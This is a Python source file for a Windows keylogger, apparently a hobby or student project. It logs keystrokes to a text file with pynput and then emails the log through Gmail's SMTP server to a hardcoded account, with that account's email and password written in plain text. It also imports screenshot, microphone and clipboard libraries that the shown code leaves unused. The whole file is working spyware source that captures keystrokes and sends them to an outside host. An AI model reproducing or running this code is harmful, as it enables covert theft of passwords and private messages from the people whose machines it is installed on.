# Libraries

# Libraries for collecting computer information.
import socket
import platform

# Library for system info & time.
import time
import os

# Library for registring keystrokes.
from pynput.keyboard import Key, Listener

# Library for clipboard.
import win32clipboard

# Library for mic capabilities.
from scipy.io.wavfile import write
import sounddevice as sd

# Library for Encryption.
from cryptography.fernet import Fernet

import getpass
from requests import get

# Library for importing screenshots.
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Library for email related functions.
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Log file 

keys_info = "key_log.txt"

file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
extend = "\\"

count = 0
keys = []

def on_press(key):
    global keys, count
    
    print(key)
    keys.append(key)
    count += 1
    
    if count>= 1:
        count = 0
        write_file(keys)
        keys = []
        
def  write_file(keys):
    with open(file_path + extend + keys_info, "a") as k:
        for key in keys:
            c = str(key).replace("'", "")
            if c.find ("space") > 0:
                k.write('\n')
                k.close()
            elif c.find("Key") == -1:
                k.write(c)
                k.close()
                
def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

email_address = "keyloggerproj67@gmail.com"
email_password = "Higoogle@1167"
toaddress = "keyloggerproj67@gmail.com"

# Email function to send the key log file.
def send_email(filename, attatchment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger Log File"
    body = "Please find the attached keylogger log file."
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attatchment, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)    
    server_keylogger = smtplib.SMTP('smtp.gmail.com', 587)
    server_keylogger.starttls()
    server_keylogger.login(fromaddr, email_password)
    text = msg.as_string()
    server_keylogger.sendmail(fromaddr, toaddr, text)
    server_keylogger.quit()

send_email(keys_info, file_path + extend + keys_info, toaddress)



